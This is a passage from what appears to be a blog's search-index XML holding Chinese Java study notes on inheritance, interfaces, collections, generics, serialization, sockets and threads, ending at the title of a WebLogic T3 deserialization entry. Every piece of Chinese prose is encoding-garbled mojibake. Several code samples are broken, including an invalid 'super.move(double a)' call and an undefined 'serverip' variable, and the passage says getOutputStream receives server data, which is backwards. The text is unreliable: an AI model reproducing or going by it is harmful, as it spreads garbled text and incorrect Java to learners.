class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">move</span><span class="params">(<span class="type">double</span> a)</span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;åŠ¨ç‰©å¯ä»¥ç§»åŠ¨&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">move</span><span class="params">(<span class="type">double</span> a)</span>&#123;</span><br><span class="line">      <span class="built_in">super</span>.move(<span class="type">double</span> a); <span class="comment">// åº”ç”¨superç±»çš„æ–¹æ³•</span></span><br><span class="line">      System.out.println(<span class="string">&quot;ç‹—å¯ä»¥è·‘å’Œèµ°&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å¤šæ€"><a href="#å¤šæ€" class="headerlink" title="å¤šæ€"></a>å¤šæ€</h3><p>javaæ‰€æœ‰å¯¹è±¡éƒ½æœ‰å¤šæ€æ€§ï¼Œæ¯”å¦‚<code>public class Deer extends Animal implements Vegetarian&#123;&#125;</code>å°±åŒæ—¶å…·æœ‰Animalã€vegetarianã€Deerã€Objectçš„æ€§è´¨ã€‚</p><p>è¿™é‡Œéƒ½ä¸ç”¨ç®¡ï¼Œè™šæ–¹æ³•é‚£äº›ä¹Ÿä¸ç”¨å­¦</p><h2 id="æŠ½è±¡ç±»-amp-æ–¹æ³•"><a href="#æŠ½è±¡ç±»-amp-æ–¹æ³•" class="headerlink" title="æŠ½è±¡ç±»&amp;æ–¹æ³•"></a>æŠ½è±¡ç±»&amp;æ–¹æ³•</h2><p>æŠ½è±¡ç±»å°±æ˜¯å®šä¹‰äº†ç±»ï¼Œä½†æ˜¯æ²¡æœ‰å®ç°ã€‚æŠ½è±¡ç±»ç”¨abstractå®šä¹‰</p><p>å› ä¸ºæ²¡æœ‰å®ç°ï¼ŒæŠ½è±¡ç±»çš„å®ä¾‹åŒ–è‡ªç„¶ä¹Ÿæ²¡æœ‰æ„ä¹‰ã€‚æŠ½è±¡ç±»å­˜åœ¨çš„æ„ä¹‰å°±æ˜¯è®©å­ç±»ç»§æ‰¿ï¼Œå¹¶å®ç°å…¶ä¸­çš„éƒ¨åˆ†orå…¨éƒ¨æ–¹æ³•</p><blockquote><p>å¦‚æœä¸€ä¸ªç±»åŒ…å«æŠ½è±¡æ–¹æ³•ï¼Œè¯¥ç±»å¿…é¡»æ˜¯æŠ½è±¡ç±»ã€‚è€Œä¸”å­ç±»ç»§æ‰¿æ—¶å¿…é¡»å°†æŠ½è±¡æ–¹æ³•å…¨éƒ¨å®ç°ã€‚å¦åˆ™å­ç±»ä¸ºæŠ½è±¡ç±»</p></blockquote><h2 id="æ¥å£"><a href="#æ¥å£" class="headerlink" title="æ¥å£"></a>æ¥å£</h2><p>æ¥å£ä¸èƒ½ç”Ÿæˆå¯¹è±¡ã€‚ç»§æ‰¿æ¥å£çš„ç±»å¿…é¡»å®ç°æ¥å£å†…æ‰€æœ‰æ–¹æ³•ï¼ˆä¸ç„¶å°±æ˜¯æŠ½è±¡ç±»ï¼‰ï¼Œé™¤æ­¤ä»¥å¤–ï¼š</p><ol><li><p>æ¥å£æ²¡æœ‰æ„é€ æ–¹æ³•</p></li><li><p>æ¥å£å†…æ‰€æœ‰æ–¹æ³•éƒ½å¿…é¡»æ˜¯æŠ½è±¡æ–¹æ³•ï¼ˆæ¥å£éšå¼æŠ½è±¡ï¼Œä¹Ÿå°±æ˜¯å£°æ˜æ–¹æ³•ä¸éœ€è¦ç”¨abstractæŒ‡å®šæŠ½è±¡æ–¹æ³•ï¼ŒåŒç†å£°æ˜æ¥å£ä¹Ÿä¸€æ ·)ã€‚æ¥å£æ–¹æ³•éƒ½æ˜¯å…¬æœ‰</p></li><li><p>æ¥å£ä¸èƒ½åŒ…å«é™¤staticã€finalä¹‹å¤–çš„æˆå‘˜å˜é‡</p></li></ol><p>ç”¨<code>public interface æ¥å£å( extends ç±»)</code>çš„æ–¹å¼å£°æ˜æ¥å£ã€‚</p><p>ç”¨<code>public class ç±»å implements æ¥å£å[,...å¤šä¸ªæ¥å£]</code>çš„æ–¹å¼å®ç°æ¥å£ã€‚</p><blockquote><p>å®ç°æ¥å£æ—¶ä¸èƒ½æŠ›å‡ºå¼ºåˆ¶æ€§å¼‚å¸¸ï¼Œåªèƒ½åœ¨çˆ¶ç±»æˆ–è€…çˆ¶æ¥å£ä¸­æŠ›å‡ºè¯¥å¼ºåˆ¶æ€§å¼‚å¸¸</p></blockquote><p>æ¥å£çš„ç»§æ‰¿ä¹Ÿä½¿ç”¨extendsï¼ŒåŒç†åœ¨å®ç°æ¥å£æ—¶éœ€è¦å®ç°è¯¥æ¥å£åŠå…¶çˆ¶ç±»æ¥å£çš„å…¨éƒ¨æ–¹æ³•ã€‚</p><h2 id="packageåŒ…"><a href="#packageåŒ…" class="headerlink" title="packageåŒ…"></a>packageåŒ…</h2><p>æ¯”å¦‚ä¸‹åˆ—ä»£ç çš„è·¯å¾„å°±æ˜¯org.example.A.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">A</span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>åŒæ ·ï¼Œæœ‰ä¸€ä¸ªä»£ç æ˜¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">B</span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆåœ¨ä½¿ç”¨çš„æ—¶å€™import org.example.*;æˆ–è€…import org.example.A;import org.example.B;å°±èƒ½åŒæ—¶ä½¿ç”¨Aã€Bä¸¤ä¸ªç±»</p><p>æ­£å› é€šè¿‡è·¯å¾„ä½¿ç”¨åŒ…çš„æ–¹å¼ï¼ŒAã€Bå°±å¿…é¡»å­˜æ”¾åœ¨å·¥ä½œç›®å½•çš„org&#x2F;exampleç›®å½•ä¸‹</p><h2 id="javaæ•°æ®ç»“æ„"><a href="#javaæ•°æ®ç»“æ„" class="headerlink" title="javaæ•°æ®ç»“æ„"></a>javaæ•°æ®ç»“æ„</h2><h3 id="æšä¸¾"><a href="#æšä¸¾" class="headerlink" title="æšä¸¾"></a>æšä¸¾</h3><p>Enumeration å®šä¹‰æšä¸¾æ•°æ®ã€‚å…¶å®æšä¸¾å°±åƒä¸€ä¸ªä¸€æ¬¡æ€§æ•°ç»„ã€‚æ¯”å¦‚w3schoolç»™å‡ºçš„ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">      Enumeration days;</span><br><span class="line">      <span class="type">Vector</span> <span class="variable">dayNames</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Vector</span>();</span><br><span class="line">      dayNames.add(<span class="string">&quot;Monday&quot;</span>);</span><br><span class="line">      dayNames.add(<span class="string">&quot;Tuesday&quot;</span>);</span><br><span class="line">      dayNames.add(<span class="string">&quot;Wednesday&quot;</span>);</span><br><span class="line">      dayNames.add(<span class="string">&quot;Thursday&quot;</span>);</span><br><span class="line">      dayNames.add(<span class="string">&quot;Friday&quot;</span>);</span><br><span class="line">      days = dayNames.elements();</span><br><span class="line">      <span class="keyword">while</span> (days.hasMoreElements())&#123;</span><br><span class="line">         System.out.println(days.nextElement()); </span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨Vectorå®¹å™¨åŠ¨æ€å­˜æ”¾å­—ç¬¦ä¸²æ•°ç»„ã€‚ç”¨elementè¿”å›vectorä¸­å…ƒç´ æšä¸¾ï¼ˆé˜Ÿåˆ—å½¢å¼ï¼Œä¸çŸ¥é“é˜Ÿåˆ—å’Œæ ˆçš„è½¬æˆ˜æ•°æ®ç»“æ„ï¼‰</p><p>hasMoreElementsåˆ¤æ–­å®¹å™¨ä¸­è¿˜æœ‰æ— æšä¸¾ã€‚nextElement()è¿”å›ä¸‹ä¸€ä¸ªæšä¸¾å…ƒç´ </p><h3 id="ä½é›†åˆ-Bitset"><a href="#ä½é›†åˆ-Bitset" class="headerlink" title="ä½é›†åˆ(Bitset)"></a>ä½é›†åˆ(Bitset)</h3><p>å…³äºC++bitsetå¯ä»¥å»çœ‹æˆ‘çš„sha256ç®—æ³•çš„bitsetå®ç°<a href="https://blog.csdn.net/qq_51796436/article/details/124999060?spm=1001.2014.3001.5502%E3%80%82%E5%85%B6%E5%AE%9Ebitset%E5%B0%B1%E6%98%AF%E4%B8%80%E4%B8%AAbool%E6%95%B0%E7%BB%84%EF%BC%8C%E5%8F%AA%E4%B8%8D%E8%BF%87%E5%AF%B9bool%E5%80%BC%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%81%9A%E4%BA%86%E5%BE%88%E5%A4%9A%E4%BC%98%E5%8C%96">https://blog.csdn.net/qq_51796436/article/details/124999060?spm=1001.2014.3001.5502ã€‚å…¶å®bitsetå°±æ˜¯ä¸€ä¸ªboolæ•°ç»„ï¼Œåªä¸è¿‡å¯¹boolå€¼çš„å®ç°åšäº†å¾ˆå¤šä¼˜åŒ–</a></p><h3 id="å‘é‡-vectorå®¹å™¨"><a href="#å‘é‡-vectorå®¹å™¨" class="headerlink" title="å‘é‡(vectorå®¹å™¨)"></a>å‘é‡(vectorå®¹å™¨)</h3><p>åŠ¨æ€æ•°ç»„ã€‚å’ŒArrayListçš„ä¸»è¦åŒºåˆ«æ˜¯vectoråŒ…å«äº†å¾ˆå¤šä¸å±äºé›†åˆæ¡†æ¶çš„æ–¹æ³•ã€‚ç”¨newçš„æ–¹å¼æ–°å»ºå®¹å™¨ï¼Œç”¨è°ƒç”¨æ–¹æ³•çš„æ–¹å¼ä½¿ç”¨å®¹å™¨ï¼Œæ¯”å¦‚æœ‰ä»¥ä¸‹å¸¸ç”¨çš„æ–¹æ³•ï¼š</p><ul><li>elements()è¿”å›å®¹å™¨æšä¸¾</li><li>hashCode()è¿”å›å‘é‡å“ˆå¸Œç </li><li>toString()è¿”å›å‘é‡çš„å­—ç¬¦ä¸²å½¢å¼ï¼ˆæ¯ä¸ªå…ƒç´ çš„Stringï¼‰</li></ul><h3 id="æ ˆ"><a href="#æ ˆ" class="headerlink" title="æ ˆ"></a>æ ˆ</h3><p>åè¿›å…ˆå‡ºã€‚æ˜¯vectorçš„å­ç±»ï¼Œæ‰€ä»¥èƒ½ä½¿ç”¨vectorçš„æ–¹æ³•ã€‚å®šä¹‰æ–¹å¼å’Œvectorå®¹å™¨ä¸€æ ·:</p><p><code>Stack a = new Stack();</code></p><p>push(a)å‹æ ˆï¼Œpop()å‡ºæ ˆï¼Œpeek()æŸ¥çœ‹æ ˆé¡¶éƒ¨ä½†ä¸è¿›è¡Œå‡ºæ ˆæ“ä½œ</p><h3 id="å“ˆå¸Œè¡¨-amp-HashMapï¼ˆå…³é”®ï¼‰"><a href="#å“ˆå¸Œè¡¨-amp-HashMapï¼ˆå…³é”®ï¼‰" class="headerlink" title="å“ˆå¸Œè¡¨&amp;HashMapï¼ˆå…³é”®ï¼‰"></a>å“ˆå¸Œè¡¨&amp;HashMapï¼ˆå…³é”®ï¼‰</h3><p>Hashtableå’ŒHashMapä¸€æ ·ï¼Œåªæ˜¯Hashtableæ”¯æŒåŒæ­¥ã€‚å¯ä»¥ç†è§£ä¸ºjavascriptè¯­è¨€çš„å‘½åç´¢å¼•ã€‚ç”¨key-valueçš„æ–¹å¼ç»„æˆæ•°ç»„ï¼Œä¸€ä¸ªkeyå¯¹åº”ä¸€ä¸ªvalueã€‚</p><h3 id="å±æ€§ï¼ˆPropertiesæ¥å£ï¼‰"><a href="#å±æ€§ï¼ˆPropertiesæ¥å£ï¼‰" class="headerlink" title="å±æ€§ï¼ˆPropertiesæ¥å£ï¼‰"></a>å±æ€§ï¼ˆPropertiesæ¥å£ï¼‰</h3><p>Propertiesç»§æ‰¿äºHashtableï¼Œåªä¸è¿‡key-valueéƒ½æ˜¯å­—ç¬¦ä¸²</p><h2 id="æ³›å‹"><a href="#æ³›å‹" class="headerlink" title="æ³›å‹"></a>æ³›å‹</h2><p>æ‰€è°“æ³›å‹ä¹Ÿå°±æ˜¯åŒæ—¶æŒ‡ä»£äº†å¤šä¸ªæ•°æ®ç±»å‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt; E &gt; <span class="keyword">void</span> <span class="title function_">printArray</span><span class="params">( E[] inputArray )</span></span><br><span class="line">   &#123;</span><br><span class="line">      <span class="comment">// è¾“å‡ºæ•°ç»„å…ƒç´             </span></span><br><span class="line">         <span class="keyword">for</span> ( E element : inputArray )&#123;        </span><br><span class="line">            System.out.printf( <span class="string">&quot;%s &quot;</span>, element );</span><br><span class="line">         &#125;</span><br><span class="line">         System.out.println();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç å®šä¹‰äº†ä¸€ä¸ªå‡½æ•°è¾“å‡ºæ•°ç»„å…ƒç´ ï¼Œæ³›å‹å‚æ•°çš„å£°æ˜ä¸º<code>&lt;E&gt;</code>,E[]å°±æŒ‡ä»£äº†ä»»æ„ç±»å‹çš„æ•°ç»„ã€‚å› ä¸ºé€šå¸¸æ³›å‹çš„è¿”å›å€¼ä¹Ÿæ˜¯æ³›å‹ï¼Œæ‰€ä»¥å£°æ˜æ–¹æ³•æ—¶ä¹Ÿå°±è¿›è¡Œæ³›å‹å£°æ˜ã€‚</p><p>å†çœ‹ä¸€ä¸ªæ³›å‹æ–¹æ³•çš„å®šä¹‰ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T <span class="keyword">extends</span> <span class="title class_">Comparable</span>&lt;T&gt;&gt; T <span class="title function_">maximum</span><span class="params">(T x, T y, T z)</span></span><br><span class="line">   </span><br></pre></td></tr></table></figure><p>ç”¨extendsç»§æ‰¿çš„æ–¹å¼å®šä¹‰ä¸Šç•Œï¼Œé‚£ä»€ä¹ˆæ˜¯ä¸Šç•Œå‘¢ï¼Ÿ</p><p>åœ¨æ•°å­¦ä¸Šæ¥çœ‹ï¼Œæ³›å‹å°±æ„å‘³ç€å®šä¹‰åŸŸRã€‚ä½†ä¸€èˆ¬æ¥è¯´æ¥æ”¶çš„å‚æ•°å¯èƒ½åªè¦æ•°å­—numberæˆ–è€…æ­£æ•°åŸŸè¿™äº›ç›¸å¯¹ç‹­çª„çš„åŸŸï¼Œå°±éœ€è¦ä¸€ä¸ªä¸Šç•Œç¼©å°éœ€è¦å€¼çš„èŒƒå›´</p><p>ä¸Šè¿°å®šä¹‰è§„å®šäº†æ³›å‹T ä¸Šç•Œä¸º<code>Comparable&lt;T&gt;</code>ã€‚æŸ¥çœ‹Compareableçš„æºç å¯ä»¥çœ‹åˆ°è¯¥æ¥å£æ¥æ”¶å‚æ•°ä¹Ÿä¸ºæ³›å‹ã€‚<code>&lt;T extends Comparable&lt;T&gt;&gt;</code>å®šä¹‰å®Œæ³›å‹Tåè¦ç´§æ¥ä¸€ä¸ªTï¼Œæ²¡å®šä¹‰ä¸ç”¨æ¥</p><p>æœ‰æ³›å‹æ–¹æ³•å°±æœ‰æ³›å‹ç±»ï¼Œæ³›å‹ç±»çš„å®šä¹‰å’Œä½¿ç”¨å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Box</span>&lt;T&gt; &#123;&#125;<span class="comment">//å®šä¹‰</span></span><br><span class="line">Box&lt;String&gt; stringBox = <span class="keyword">new</span> <span class="title class_">Box</span>&lt;String&gt;();<span class="comment">//mainä¸­çš„ä½¿ç”¨</span></span><br></pre></td></tr></table></figure><h2 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h2><p>åºåˆ—åŒ–çš„ç›®çš„å°±æ˜¯æ–¹ä¾¿å­˜å–ã€‚</p><p>åºåˆ—åŒ–ä¸€èˆ¬æ˜¯writeObjectï¼Œååºåˆ—åŒ–ä¸€èˆ¬æ˜¯readObjectã€‚</p><ul><li>å¯ä»¥åºåˆ—åŒ–çš„ç±»å¿…é¡»æ»¡è¶³ï¼š<strong>å¿…é¡»å®ç°äº†java.io.Serializableå¯¹è±¡</strong></li></ul><p>åºåˆ—åŒ–åªéœ€è¦ä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FileOutputStream</span> <span class="variable">fileOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ç±»è·¯å¾„&quot;</span>);</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOut);</span><br><span class="line">out.writeObject(e);</span><br><span class="line">out.close();</span><br><span class="line">fileOut.close();</span><br></pre></td></tr></table></figure><p>å°†æ–‡ä»¶æµå†™å…¥FileOutputStreamæµï¼Œç„¶åå°†FileOutputStreamå†™å…¥åˆ°å¯¹è±¡æµObjectOutputStreamä¸­ï¼Œç„¶åè¿›è¡Œåºåˆ—åŒ–</p><p>åŒç†ï¼Œååºåˆ—åŒ–ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FileInputStream</span> <span class="variable">fileIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ç±»è·¯å¾„&quot;</span>);</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileIn);</span><br><span class="line">e = (Employee) in.readObject();</span><br><span class="line">in.close();</span><br><span class="line">fileIn.close();</span><br></pre></td></tr></table></figure><p>éœ€è¦ç”¨(Employee)æŒ‡å®šå…¥å£ç±»ã€‚è¿™æ ·åºåˆ—åŒ–eå°±æˆäº†ç±»å¼•ç”¨</p><h2 id="javaç½‘ç»œç¼–ç¨‹"><a href="#javaç½‘ç»œç¼–ç¨‹" class="headerlink" title="javaç½‘ç»œç¼–ç¨‹"></a>javaç½‘ç»œç¼–ç¨‹</h2><p>ä¸€æƒ³èµ·ç½‘ç»œç¼–ç¨‹è¿™å››ä¸ªå­—å°±åº”è¯¥æƒ³èµ·å¥—æ¥å­—ï¼Œä¹Ÿå°±æ˜¯ip:portçš„å½¢å¼ã€‚ç›´æ¥æ¥çœ‹ä¸€ä¸ªæœ€ç®€åŒ–çš„å®¢æˆ·ç«¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ–‡ä»¶å GreetingClient.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GreetingClient</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String [] args)</span></span><br><span class="line">   &#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">serverName</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">      <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> Integer.parseInt(args[<span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">         <span class="type">Socket</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(serverip, port);</span><br><span class="line">         <span class="type">OutputStream</span> <span class="variable">outToServer</span> <span class="operator">=</span> client.getOutputStream();</span><br><span class="line">         <span class="type">DataOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(outToServer);</span><br><span class="line"> out.writeUTF(<span class="string">&quot;Hello from &quot;</span>+ client.getLocalSocketAddress());</span><br><span class="line">         <span class="type">InputStream</span> <span class="variable">inFromServer</span> <span class="operator">=</span> client.getInputStream();</span><br><span class="line">         <span class="type">DataInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(inFromServer);</span><br><span class="line">         System.out.println(<span class="string">&quot;Server says &quot;</span> + in.readUTF());</span><br><span class="line">         client.close();</span><br><span class="line">      &#125;<span class="keyword">catch</span>(IOException e)</span><br><span class="line">      &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®šä¹‰ä¸€ä¸ªsocketå¯¹è±¡ã€‚</p><p>getOutputStream()å³æ¥æ”¶æ¥è‡ªæœåŠ¡ç«¯çš„æ•°æ®ï¼Œå¹¶è½¬åŒ–ä¸ºOutputStreamæµå†™å…¥åˆ°DataOutputStreamï¼Œå†è°ƒç”¨æ–¹æ³•è¾“å‡º</p><p>getInputStreamè¾“å…¥æ¶ˆæ¯ï¼Œåˆ›å»ºæ•°æ®å¯¹è±¡DataInputStreamï¼Œå¹¶æŠŠè¦å‘é€çš„æ¶ˆæ¯å†™å…¥åˆ°æ•°æ®æµã€‚</p><p>æœåŠ¡ç«¯åŒç†ã€‚åªä¸è¿‡ç”¨serverSocket.accept()æ¥æ”¶å¥—æ¥å­—è¿æ¥è¯·æ±‚</p><h2 id="å¤šçº¿ç¨‹"><a href="#å¤šçº¿ç¨‹" class="headerlink" title="å¤šçº¿ç¨‹"></a>å¤šçº¿ç¨‹</h2><p>javaå®ç°å¤šçº¿ç¨‹æœ‰ä¸‰ç§æ–¹å¼</p><ol><li>ç»§æ‰¿Runnableæ¥å£ï¼ˆ<code>implements Runnable</code>)</li><li>ç»§æ‰¿Threadç±»ï¼ˆ<code>extends Thread</code>)</li><li>Callableå’ŒFutureç»“åˆä½¿ç”¨ï¼Œå¹¶å®ç°call()æ–¹æ³•</li></ol><p>é€šè¿‡<code>new çº¿ç¨‹()</code>çš„æ–¹å¼åœ¨mainå‡½æ•°åˆ›å»ºæ–°çº¿ç¨‹ã€‚å®šä¹‰çº¿ç¨‹çš„åŒæ—¶éœ€è¦é‡å†™æ„é€ å‡½æ•°ã€‚</p><ul><li>çº¿ç¨‹æœ¬èº«ä¸ºä¸»çº¿ç¨‹ï¼Œstartä¼šç”Ÿæˆå­çº¿ç¨‹;ä¸€ä¸ªstartå¼€å¯ä¸€ä¸ªå­çº¿ç¨‹ï¼Œå­çº¿ç¨‹ä¼šé»˜è®¤æ‰§è¡Œä¸€érun()</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">NewThread</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">   NewThread() &#123;</span><br><span class="line">      <span class="comment">// åˆ›å»ºç¬¬äºŒä¸ªæ–°çº¿ç¨‹</span></span><br><span class="line">      start(); <span class="comment">// å¼€å§‹çº¿ç¨‹</span></span><br><span class="line">   &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>å‰é¢ä¸¤ä¸ªéƒ½è¦é‡å†™run()æ–¹æ³•ä½œä¸ºçº¿ç¨‹æ‰§è¡Œçš„ä¸»ä½“ï¼ˆRunnableéå¿…è¦ï¼‰ã€‚</p><h2 id="å…¶ä»–å†…å®¹"><a href="#å…¶ä»–å†…å®¹" class="headerlink" title="å…¶ä»–å†…å®¹"></a>å…¶ä»–å†…å®¹</h2><p>javaçš„ç¼–è¯‘å™¨ä¸€èˆ¬ä¸‹Intellij IDEAï¼ˆä¸“ä¸šç‰ˆï¼Œéä¸“ä¸šç‰ˆæ²¡æœ‰å¾ˆå¤šåç»­å­¦ä¹ éœ€è¦çš„ä¸œè¥¿ï¼‰ã€‚</p><p>javaå¯èƒ½ä¼šéœ€è¦å¾ˆå¤šç‰ˆæœ¬ï¼Œæ¯”å¦‚jdk8u65\jdk8u111\jdk8u200ä»¥ä¸Šç­‰ï¼Œå¯ä»¥åŒæ—¶å­˜æ”¾åœ¨ä¸€ä¸ªç›®å½•ï¼Œéœ€è¦ç”¨åˆ°çš„æ—¶å€™åœ¨IDEAé¡¹ç›®ç»“æ„é‡Œåˆ‡æ¢SDK</p><p>java8ç‰ˆæœ¬ä¹Ÿå«1.8</p><p>è£…å®Œjavaå‘ç°ä½ çš„burpsuite ã€èœåˆ€ç­‰å·¥å…·å´©äº†ï¼Œæ”¹å›ä»¥å‰çš„ç¯å¢ƒå§ã€‚ç¯å¢ƒå˜é‡æ”¹ä¸€ä¸‹å°±è¡Œ</p><p>movenåªæ˜¯ä¸€ç§ç®¡ç†å·¥å…·</p><p>IDEAåŒå‡»shiftæŸ¥æ‰¾ç±»oræ–¹æ³•</p><p>ä¿®æ”¹ä¾èµ–é€šå¸¸åªéœ€è¦åœ¨pom.xmlä¿®æ”¹dependencyç„¶åå³é”®-&gt;moven-&gt;é‡æ–°åŠ è½½å°±è¡Œ</p><p>æƒ³å­¦ä¹ java webå®‰å…¨çš„å¯ä»¥åœ¨å…ˆçŸ¥ç¤¾åŒºçœ‹çœ‹æˆ‘çš„javaåå°„&amp;Common-collections1&amp;6ã€‚é“¾æ¥å¦‚ä¸‹ï¼šåç»­åº”è¯¥ä¼šå†™å¾ˆå¤šjava web</p><p><a href="https://xz.aliyun.com/t/11861#toc-7">https://xz.aliyun.com/t/11861#toc-7</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> javaæ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javaæ‚è®º </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Weblogic T3 ååºåˆ—åŒ–</title>
      <link href="/2022/05/09/weblogict3-xie-yi-gong-ji/"/>
      <url>/2022/05/09/weblogict3-xie-yi-gong-ji/</url>
      
